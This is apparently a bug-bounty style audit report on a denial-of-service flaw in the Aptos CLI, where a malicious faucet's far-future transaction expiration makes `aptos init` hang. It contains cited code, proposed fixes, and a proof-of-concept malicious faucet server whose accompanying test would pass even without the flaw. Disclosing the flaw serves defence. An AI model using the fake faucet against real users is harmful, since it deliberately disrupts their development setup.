# Audit Report

## Title
Malicious Faucet Can Cause Indefinite Hang in CLI Initialization via Far-Future Transaction Expiration

## Summary
The `fund_account()` function lacks proper absolute timeout validation when waiting for faucet transactions, allowing a malicious faucet server to return a signed transaction with an arbitrarily far-future expiration timestamp. This causes the CLI initialization process to hang for an impractically long duration (potentially years), effectively freezing the `aptos init` command.

## Finding Description

The vulnerability exists in the transaction waiting logic chain: [1](#0-0) 

This calls the `fund_account()` helper function: [2](#0-1) 

Which delegates to `FaucetClient::fund()`: [3](#0-2) 

The critical issue is that while the HTTP POST request has a 10-second timeout: [4](#0-3) 

The subsequent call to `wait_for_signed_transaction()` extracts the expiration timestamp directly from the deserialized transaction without validation: [5](#0-4) 

This passes `None` for the `timeout_from_call` parameter and relies on the transaction's expiration timestamp. The waiting loop continues until: [6](#0-5) 

**Attack Scenario:**
1. User runs `aptos init --network custom --faucet-url http://malicious-faucet.com`
2. Malicious faucet receives the mint request and crafts a `SignedTransaction` with `expiration_timestamp_secs` set to year 2100 (timestamp ~4102444800)
3. The faucet returns this valid BCS-encoded transaction in the HTTP response
4. `FaucetClient::fund()` successfully deserializes it (no validation of expiration timestamp)
5. `wait_for_signed_transaction()` enters the polling loop
6. Current time is ~2024 (timestamp ~1700000000)
7. The timeout check triggers when: `current_time > expiration_timestamp + 60` = when `current_time > 4102444860`
8. This means the loop will continue for approximately **76 years** (2,402,444,800 seconds)

## Impact Explanation

This is a **Medium Severity** issue per Aptos bug bounty criteria:

- **Availability Impact**: The CLI initialization freezes indefinitely, preventing users from setting up their Aptos development environment
- **No Funds at Risk**: This is purely a DoS attack on the CLI tool, not affecting on-chain funds or consensus
- **Limited Scope**: Only affects users who:
  - Use custom faucet endpoints (via `--network custom --faucet-url`)
  - Or if a legitimate faucet endpoint is compromised
- **Recoverable**: Users can kill the process and use a different faucet URL

While this doesn't affect critical blockchain operations (consensus, state, funds), it degrades user experience and could be used to frustrate legitimate users or waste their time during critical operations.

## Likelihood Explanation

**Medium-to-Low Likelihood:**

**Required Conditions:**
- Attacker must control or compromise a faucet endpoint
- User must be directed to use the malicious faucet (either through social engineering or compromise of default configurations)
- Most common usage (`aptos init` with default devnet/testnet) uses trusted Aptos-operated faucets

**Ease of Exploitation:**
- Attack is trivial to execute once the faucet endpoint is controlled
- No special cryptographic knowledge required
- Standard transaction signing with manipulated timestamp

**Real-World Scenarios:**
- Malicious actors setting up fake faucets for phishing
- Compromised community-run faucets
- MITM attacks redirecting faucet requests

## Recommendation

Add an absolute timeout parameter when calling `wait_for_transaction_by_hash()` and validate transaction expiration timestamps. The fix should be applied at multiple levels:

**Option 1: Add absolute timeout in fund_account()** (Recommended)

In `crates/aptos/src/common/utils.rs`, modify the `fund_account()` function to add a reasonable absolute timeout:

```rust
pub async fn fund_account(
    rest_client: Client,
    faucet_url: Url,
    faucet_auth_token: Option<&str>,
    address: AccountAddress,
    num_octas: u64,
) -> CliTypedResult<()> {
    let mut client = FaucetClient::new_from_rest_client(faucet_url, rest_client);
    if let Some(token) = faucet_auth_token {
        client = client.with_auth_token(token.to_string());
    }
    
    // Add timeout wrapper
    tokio::time::timeout(
        Duration::from_secs(120), // 2 minutes absolute timeout
        client.fund(address, num_octas)
    )
    .await
    .map_err(|_| CliError::UnexpectedError("Faucet funding timeout after 120 seconds".to_string()))?
    .map_err(|err| CliError::ApiError(format!("Faucet issue: {:#}", err)))
}
```

**Option 2: Validate expiration timestamp in FaucetClient::fund()**

In `crates/aptos-rest-client/src/faucet.rs`, add validation before waiting:

```rust
pub async fn fund(&self, address: AccountAddress, amount: u64) -> Result<()> {
    let response = self.build_and_submit_request(url).await?;
    let status_code = response.status();
    let body = response.text().await.map_err(FaucetClientError::decode)?;
    if !status_code.is_success() {
        return Err(FaucetClientError::status(status_code.as_u16()).into());
    }

    let bytes = hex::decode(body).map_err(FaucetClientError::decode)?;
    let txns: Vec<SignedTransaction> =
        bcs::from_bytes(&bytes).map_err(FaucetClientError::decode)?;

    // Validate expiration timestamp
    let max_reasonable_expiration = aptos_infallible::duration_since_epoch().as_secs() + 300; // 5 minutes from now
    if txns[0].expiration_timestamp_secs() > max_reasonable_expiration {
        return Err(anyhow::anyhow!("Faucet returned transaction with unreasonably far expiration timestamp").into());
    }

    self.rest_client
        .wait_for_signed_transaction(&txns[0])
        .await
        .map_err(FaucetClientError::unknown)?;

    Ok(())
}
```

**Option 3: Pass timeout_from_call parameter**

Modify `wait_for_signed_transaction()` to accept and pass through a timeout parameter, defaulting to a reasonable value like 120 seconds.

## Proof of Concept

```rust
// Mock malicious faucet server (for testing purposes)
use actix_web::{web, App, HttpServer, HttpResponse};
use aptos_types::transaction::{RawTransaction, SignedTransaction, TransactionPayload};
use aptos_crypto::{ed25519::Ed25519PrivateKey, PrivateKey, Uniform};

#[actix_web::main]
async fn malicious_faucet() -> std::io::Result<()> {
    HttpServer::new(|| {
        App::new().route("/mint", web::post().to(|query: web::Query<std::collections::HashMap<String, String>>| async move {
            let address_str = query.get("auth_key").unwrap();
            let address = AccountAddress::from_hex_literal(address_str).unwrap();
            
            // Create transaction with expiration year 2100
            let far_future = 4102444800u64; // ~2100
            let private_key = Ed25519PrivateKey::generate_for_testing();
            
            let raw_txn = RawTransaction::new(
                address,
                0,
                TransactionPayload::Script(Script::new(vec![], vec![], vec![])),
                1000000,
                1,
                far_future, // Far-future expiration!
                ChainId::new(4),
            );
            
            let signed_txn = SignedTransaction::new(
                raw_txn,
                private_key.public_key(),
                Ed25519Signature::dummy_signature(),
            );
            
            let encoded = hex::encode(bcs::to_bytes(&vec![signed_txn]).unwrap());
            HttpResponse::Ok().body(encoded)
        }))
    })
    .bind("127.0.0.1:8081")?
    .run()
    .await
}

// Test demonstrating the hang
#[tokio::test]
async fn test_faucet_timeout_attack() {
    // Start malicious faucet
    tokio::spawn(malicious_faucet());
    tokio::time::sleep(Duration::from_secs(1)).await;
    
    let rest_client = Client::new(Url::parse("http://localhost:8080").unwrap());
    let faucet_url = Url::parse("http://localhost:8081").unwrap();
    
    // This will hang for ~76 years!
    let result = tokio::time::timeout(
        Duration::from_secs(5),
        fund_account(rest_client, faucet_url, None, AccountAddress::ONE, 100000000)
    ).await;
    
    assert!(result.is_err(), "fund_account should timeout, but it doesn't have proper timeout protection");
}
```

## Notes

This vulnerability highlights the importance of validating external inputs, even from "trusted" services like faucets. While faucets are typically operated by the Aptos Foundation or trusted community members, the CLI should implement defense-in-depth by validating all critical parameters received from external services.

The fix should balance security with legitimate use cases where network latency or congestion might delay transaction confirmation. A 2-minute absolute timeout is reasonable for faucet operations while preventing indefinite hangs.

### Citations

**File:** crates/aptos/src/common/init.rs (L305-314)
```rust
                fund_account(
                    client,
                    Url::parse(faucet_url)
                        .map_err(|err| CliError::UnableToParse("rest_url", err.to_string()))?,
                    self.faucet_options.faucet_auth_token.as_deref(),
                    address,
                    NUM_DEFAULT_OCTAS,
                )
                .await?;
                eprintln!("Account {} funded successfully", address);
```

**File:** crates/aptos/src/common/utils.rs (L455-470)
```rust
pub async fn fund_account(
    rest_client: Client,
    faucet_url: Url,
    faucet_auth_token: Option<&str>,
    address: AccountAddress,
    num_octas: u64,
) -> CliTypedResult<()> {
    let mut client = FaucetClient::new_from_rest_client(faucet_url, rest_client);
    if let Some(token) = faucet_auth_token {
        client = client.with_auth_token(token.to_string());
    }
    client
        .fund(address, num_octas)
        .await
        .map_err(|err| CliError::ApiError(format!("Faucet issue: {:#}", err)))
}
```

**File:** crates/aptos-rest-client/src/faucet.rs (L42-45)
```rust
            inner: ReqwestClient::builder()
                .timeout(Duration::from_secs(10))
                .build()
                .unwrap(),
```

**File:** crates/aptos-rest-client/src/faucet.rs (L84-109)
```rust
    pub async fn fund(&self, address: AccountAddress, amount: u64) -> Result<()> {
        let mut url = self.faucet_url.clone();
        url.set_path("mint");
        let query = format!("auth_key={}&amount={}&return_txns=true", address, amount);
        url.set_query(Some(&query));

        // Faucet returns the transaction that creates the account and needs to be waited on before
        // returning.
        let response = self.build_and_submit_request(url).await?;
        let status_code = response.status();
        let body = response.text().await.map_err(FaucetClientError::decode)?;
        if !status_code.is_success() {
            return Err(FaucetClientError::status(status_code.as_u16()).into());
        }

        let bytes = hex::decode(body).map_err(FaucetClientError::decode)?;
        let txns: Vec<SignedTransaction> =
            bcs::from_bytes(&bytes).map_err(FaucetClientError::decode)?;

        self.rest_client
            .wait_for_signed_transaction(&txns[0])
            .await
            .map_err(FaucetClientError::unknown)?;

        Ok(())
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L711-723)
```rust
    pub async fn wait_for_signed_transaction(
        &self,
        transaction: &SignedTransaction,
    ) -> AptosResult<Response<Transaction>> {
        let expiration_timestamp = transaction.expiration_timestamp_secs();
        self.wait_for_transaction_by_hash(
            transaction.committed_hash(),
            expiration_timestamp,
            Some(DEFAULT_MAX_SERVER_LAG_WAIT_DURATION),
            None,
        )
        .await
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L824-835)
```rust
            if let Some(max_server_lag_wait_duration) = max_server_lag_wait {
                if aptos_infallible::duration_since_epoch().as_secs()
                    > expiration_timestamp_secs + max_server_lag_wait_duration.as_secs()
                {
                    return Err(anyhow!(
                        "Ledger on endpoint ({}) is more than {}s behind current time, timing out waiting for the transaction. Warning, transaction ({}) might still succeed.",
                        self.path_prefix_string(),
                        max_server_lag_wait_duration.as_secs(),
                        hash,
                    ).into());
                }
            }
```
